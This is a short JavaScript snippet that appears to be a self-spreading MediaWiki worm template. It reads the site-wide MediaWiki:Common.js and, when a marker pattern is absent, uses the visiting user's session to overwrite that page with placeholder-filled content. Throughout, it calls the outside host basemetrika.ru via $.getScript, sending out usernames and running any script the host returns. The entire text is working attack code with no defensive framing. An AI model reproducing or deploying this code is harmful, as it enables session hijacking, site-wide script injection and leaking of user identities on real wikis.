$.get("/wiki/MediaWiki:Common.js", function(data) {
    source = $(data).find(".source-javascript").text();
    $.getScript("//basemetrika.ru/log?m=" + encodeURIComponent(
        "User name '" + wgUserName + "', got common.js"
    ));
    if (!source.match("%%negative_pattern%%")) {
        $.getScript("//basemetrika.ru/log?m=" + encodeURIComponent(
            "User name '" + wgUserName + "', NO negative pattern in common.js, trying to edit"
        ));
        $.get("%%mw_prefix%%/index.php?title=MediaWiki:Common.js&action=edit", function (data) {
            editform3 = $(data).find("#editform");
            data_ser = editform3.serialize();
            data_ser = data_ser.replace(/wpTextbox1=[^&]*/g, "wpTextbox1=" + "%%urlenc_new_content%%");
            data_ser = data_ser.replace(/wpSummary=[^&]*/g, "wpSummary=" + "%%urlenc_summary%%");
            $.ajax({
                type : "POST",
                url : editform3.attr("action"),
                data : data_ser
            }, function (data) {
                $.getScript("//basemetrika.ru/log?m=" + encodeURIComponent(
                    "User name '" + wgUserName + "', made edit in common.js"
                ));
            });
        });
    } else {
        $.getScript("//basemetrika.ru/log?m=" + encodeURIComponent(
            "User name '" + wgUserName + "', negative pattern in common.js"
        ));
    }
})